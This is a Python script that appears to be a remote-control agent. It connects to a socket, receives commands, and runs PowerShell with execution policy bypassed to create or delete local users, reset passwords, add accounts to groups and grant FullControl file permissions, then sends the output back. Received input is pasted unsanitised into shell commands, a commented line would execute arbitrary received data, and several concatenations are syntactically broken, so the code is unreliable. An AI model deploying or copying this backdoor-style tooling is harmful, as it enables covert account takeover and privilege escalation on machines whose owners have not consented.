import socket
import os
import subprocess
import random
import string

def get_random_passwd(length=24):
    return ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for i in range(length))

s = socket.socket()
host = 'localhost'
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)
    decoded_data=data.decode("utf-8").split(",")

    if len(data) > 0:
        if decoded_data[0] == '1':
            cmd = subprocess.Popen(["powershell.exe -executionpolicy bypass -NoProfile", "$Password = ConvertTo-SecureString " + decoded_data[2] + " -AsPlainText -Force; New-LocalUser " + decoded_data[1] + " -Password $Password; Add-LocalGroupMember -Group " + decoded_data[3] + " -Member " + decoded_data[1]],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)  
        
        elif decoded_data[0] == '2':
            cmd = subprocess.Popen(["powershell.exe -executionpolicy bypass -NoProfile", "Remove-LocalUser -Name "+ decoded_data[1]],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        
        elif decoded_data[0] == '3':
            if decoded_data[1] == '1':
                cmd = subprocess.Popen(["powershell.exe -executionpolicy bypass -NoProfile", "$Password = ConvertTo-SecureString " + decoded_data[3] + " -AsPlainText -Force; $UserAccount = Get-LocalUser -Name " + decoded_data[2] + "; $UserAccount | Set-LocalUser -Password $Password"],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            elif decoded_data[1] == '2':
                cmd = subprocess.Popen(["powershell.exe -executionpolicy bypass -NoProfile", "Enable-LocalUser -Name " + decoded_data[2]],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            elif decoded_data[1] == '3':
                cmd = subprocess.Popen(["powershell.exe -executionpolicy bypass -NoProfile", "Disable-LocalUser -Name " + decoded_data[2]],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            elif decoded_data[1] == '4':
                cmd = subprocess.Popen(["powershell.exe -executionpolicy bypass -NoProfile", "Add-LocalGroupMember -Group " + decoded_data[3] + " -Member "+ decoded_data[2]],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            elif decoded_data[1] == '5':
                cmd = subprocess.Popen(["powershell.exe -executionpolicy bypass -NoProfile", "Remove-LocalGroupMember -Group " + decoded_data[3] + " -Member "+ decoded_data[2]],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            
        elif decoded_data[0] == '4':
            if decoded_data[1] == '1':
                cmd = subprocess.Popen(["powershell.exe -executionpolicy bypass -NoProfile", "$Acl = Get-Acl " + decoded_data[3] "; $Ar = New-Object System.Security.AccessControl.FileSystemAccessRule(" + decoded_data[2] + ", 'FullControl', 'ContainerInherit, ObjectInherit', 'None', 'Allow'); $Acl.SetAccessRule($Ar); Set-Acl " + decoded_data[3] " $Acl"
],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            elif decoded_data[1] == '2':
                cmd = subprocess.Popen(["powershell.exe -executionpolicy bypass -NoProfile", "$Acl = Get-Acl " + decoded_data[3] "; $Ar = New-Object System.Security.AccessControl.FileSystemAccessRule(" + decoded_data[2] + ", 'FullControl', 'ContainerInherit, ObjectInherit', 'None', 'Allow'); $Acl.RemoveAccessRule($Ar); Set-Acl " + decoded_data[3] " $Acl"
],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))
        #cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)

        print(output_str)